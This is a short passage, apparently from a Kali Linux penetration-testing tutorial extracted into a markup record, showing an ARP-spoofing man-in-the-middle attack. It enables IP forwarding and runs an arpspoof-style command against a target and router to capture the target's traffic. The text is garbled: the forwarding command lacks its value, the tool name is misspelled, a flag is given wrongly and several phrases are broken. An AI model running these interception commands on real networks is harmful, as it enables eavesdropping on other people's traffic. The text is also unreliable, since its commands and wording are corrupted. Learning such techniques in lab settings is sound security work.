- img_proc: true
  md: '```

    root@Kali:~# echo >/proc/sys/net/ipv4/ip_forward

    ```


    2. Now we need to run the arpsof command. To do so, we need to provide the network
    interface (-i), the target system (-i) and the router address as below:


    ```

    root@Kali:~# arpsof -i eth0 -t 192.168.1.132 192.168.198.2

    ```


    (You or may not have to renet the command reversing when the IP addresses setup
    the reverse connection. Reversing did not seem to work on a VMWare host, but I
    was able to capture all the traffic by just using the one command above)


    Arpsof should then start sending the modified MAC addresses.


    Now let''s see what we can capture from the target system.


